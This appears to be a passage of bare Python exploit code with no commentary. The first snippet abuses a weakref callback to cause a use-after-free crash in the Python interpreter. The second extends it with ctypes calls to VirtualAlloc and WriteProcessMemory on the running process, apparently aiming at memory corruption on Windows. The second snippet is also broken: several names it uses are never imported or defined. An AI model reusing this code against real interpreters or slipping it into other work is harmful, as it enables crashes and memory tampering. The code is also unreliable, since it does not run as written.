import weakref
class A(object):pass
def callback(x):del lst[0]
keepali0e=[]
lst=[str()]
a=A()
a.c=a
keepali0e.append(weakref.ref(a,callback))
del a
while lst:keepali0e.append(lst[:])
```

```
#!/usr/bin/env python
#coding:utf-8
from ctypes import *
from ctypes import wintypes
import weakref
class A(object):pass
def callback(x):del lst[0]
keepali0e=[]
lst=[str()]
a=A()
a.c=a
keepali0e.append(weakref.ref(a,callback))
def leak():
    dll=windll.kernel32.VirtualAlloc(None,0x1,win32con.MEM_COMMIT|0x3000,win32con.PAGE_READWRITE)
    WriteProcessMemory(windll.kernel32.GetCurrentProcess(),dll,cast(id(dll),LPVOID),4,byref(c_int(0)))
    return dll
while lst:
    keepali0e[:]=[]
    leak()
```
